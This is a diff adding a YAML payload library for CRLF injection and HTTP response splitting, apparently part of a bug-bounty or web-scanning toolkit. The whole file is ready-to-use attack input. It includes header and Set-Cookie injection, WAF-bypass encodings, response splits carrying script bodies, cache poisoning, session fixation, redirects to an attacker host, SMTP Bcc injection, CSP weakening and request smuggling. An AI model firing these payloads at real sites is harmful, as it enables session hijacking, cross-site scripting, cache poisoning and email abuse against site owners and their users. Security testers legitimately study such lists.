@@ -1,0 +1,196 @@
+id: crlf_injection
+name: CRLF Injection / Response Splitting
+version: 1.0.0
+category: injection
+description: |
+  CRLF injection payloads that smuggle headers, set cookies, split responses,
+  and chain into reflected XSS or cache poisoning. Covers raw \r\n,
+  url-encoded variants, and double-encoding for WAF bypass.
+mitre:
+  - T1190
+  - T1556
+owasp_top10:
+  - A03:2021
+references:
+  - https://owasp.org/www-community/vulnerabilities/CRLF_Injection
+  - https://book.hacktricks.xyz/pentesting-web/crlf-0d-0a
+  - https://github.com/payloadbox/crlf-injection-payloads
+related_tools:
+  - nuclei
+  - crlfuzz
+chains:
+  - bug_bounty_full
+  - web_active
+payloads:
+  - id: raw_crlf_set_cookie
+    name: Raw CRLF Set-Cookie
+    subcategory: header_inject
+    encoding: raw
+    tech_targets: [generic]
+    severity_when_works: high
+    payload: "\r\nSet-Cookie: pwn=1"
+    notes: null
+    source: common knowledge
+  - id: url_crlf_set_cookie
+    name: URL-encoded CRLF Set-Cookie
+    subcategory: header_inject
+    encoding: url
+    tech_targets: [generic]
+    severity_when_works: high
+    payload: "%0d%0aSet-Cookie:%20pwn=1"
+    notes: null
+    source: https://owasp.org/www-community/vulnerabilities/CRLF_Injection
+  - id: url_crlf_lf_only
+    name: LF-only injection
+    subcategory: filter_bypass
+    encoding: url
+    tech_targets: [generic]
+    severity_when_works: high
+    payload: "%0aSet-Cookie:%20pwn=1"
+    notes: Some servers accept lone LF
+    source: common knowledge
+  - id: double_url_encoded
+    name: Double-URL-encoded CRLF
+    subcategory: filter_bypass
+    encoding: url
+    tech_targets: [generic]
+    severity_when_works: high
+    payload: "%250d%250aSet-Cookie:%20pwn=1"
+    notes: For WAFs that decode once
+    source: common knowledge
+  - id: unicode_crlf
+    name: Unicode CRLF surrogate
+    subcategory: filter_bypass
+    encoding: unicode
+    tech_targets: [generic]
+    severity_when_works: medium
+    payload: "%u000d%u000aSet-Cookie:%20pwn=1"
+    notes: IIS legacy decoder
+    source: common knowledge
+  - id: response_split_xss
+    name: Response split with XSS body
+    subcategory: response_split
+    encoding: url
+    tech_targets: [generic]
+    severity_when_works: critical
+    payload: "%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2050%0d%0a%0d%0a<html><script>alert(1)</script></html>"
+    notes: Full response splitting
+    source: https://owasp.org/www-community/vulnerabilities/CRLF_Injection
+  - id: cache_poison_split
+    name: Cache poisoning via split
+    subcategory: cache_poison
+    encoding: url
+    tech_targets: [generic]
+    severity_when_works: critical
+    payload: "%0d%0aCache-Control:%20public,%20max-age=31536000%0d%0aX-Pwn:%20yes"
+    notes: Force caching of attacker response
+    source: https://portswigger.net/research/practical-web-cache-poisoning
+  - id: location_redirect
+    name: Location header injection
+    subcategory: header_inject
+    encoding: url
+    tech_targets: [generic]
+    severity_when_works: high
+    payload: "%0d%0aLocation:%20https://attacker.example.net"
+    notes: null
+    source: common knowledge
+  - id: x_xss_protection_off
+    name: Disable XSS auditor
+    subcategory: header_inject
+    encoding: url
+    tech_targets: [generic]
+    severity_when_works: high
+    payload: "%0d%0aX-XSS-Protection:%200%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(1)</script>"
+    notes: null
+    source: common knowledge
+  - id: jsonp_callback_split
+    name: JSONP callback split
+    subcategory: response_split
+    encoding: url
+    tech_targets: [generic]
+    severity_when_works: high
+    payload: callback=foo%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(1)</script>
+    notes: null
+    source: common knowledge
+  - id: http2_smuggling_lf
+    name: HTTP/2 -> HTTP/1.1 CRLF smuggle
+    subcategory: smuggle
+    encoding: raw
+    tech_targets: [generic]
+    severity_when_works: critical
+    payload: "test\r\nTransfer-Encoding: chunked"
+    notes: For H2.TE smuggling via header injection
+    source: https://portswigger.net/research/http-2-the-sequel-is-always-worse
+  - id: smtp_header_inject
+    name: SMTP header injection (email)
+    subcategory: smtp
+    encoding: url
+    tech_targets: [smtp]
+    severity_when_works: high
+    payload: "victim@example.net%0d%0aBcc:%20attacker@example.net"
+    notes: For contact-form -> SMTP sinks
+    source: common knowledge
+  - id: filename_inject
+    name: Content-Disposition filename inject
+    subcategory: header_inject
+    encoding: url
+    tech_targets: [generic]
+    severity_when_works: medium
+    payload: "test.txt%22%0d%0aX-Pwn:%201%0d%0a%0d%0a"
+    notes: For upload endpoints reflecting filename
+    source: common knowledge
+  - id: setcookie_session_fixation
+    name: Session fixation via Set-Cookie
+    subcategory: session_fix
+    encoding: url
+    tech_targets: [generic]
+    severity_when_works: high
+    payload: "%0d%0aSet-Cookie:%20SESSION=attackercontrolled;%20Path=/"
+    notes: null
+    source: common knowledge
+  - id: split_csp_bypass
+    name: Inject CSP-allowing header
+    subcategory: header_inject
+    encoding: url
+    tech_targets: [generic]
+    severity_when_works: high
+    payload: "%0d%0aContent-Security-Policy:%20script-src%20*%20'unsafe-inline'"
+    notes: null
+    source: common knowledge
+  - id: trailers_smuggle
+    name: Trailer header smuggle
+    subcategory: smuggle
+    encoding: url
+    tech_targets: [generic]
+    severity_when_works: medium
+    payload: "%0d%0aTrailer:%20pwn%0d%0a"
+    notes: null
+    source: common knowledge
+  - id: blind_oob_via_split
+    name: Blind OOB header
+    subcategory: oob
+    encoding: url
+    tech_targets: [generic]
+    severity_when_works: medium
+    payload: "%0d%0aX-Oob:%20http://OOB.example.net/"
+    notes: For internal log monitors that fetch headers
+    source: common knowledge
+  - id: chunked_inject
+    name: Inject Transfer-Encoding chunked
+    subcategory: smuggle
+    encoding: url
+    tech_targets: [generic]
+    severity_when_works: critical
+    payload: "%0d%0aTransfer-Encoding:%20chunked%0d%0a%0d%0a0%0d%0a%0d%0a"
+    notes: null
+    source: common knowledge
+  - id: nuclei_crlf_template
+    name: nuclei generic CRLF template
+    subcategory: tool_invoke
+    encoding: raw
+    tech_targets: [generic]
+    severity_when_works: medium
+    payload: |
+      nuclei -t http/vulnerabilities/generic/crlf-injection.yaml -u https://target.example.net
+    notes: null
+    source: https://github.com/projectdiscovery/nuclei-templates
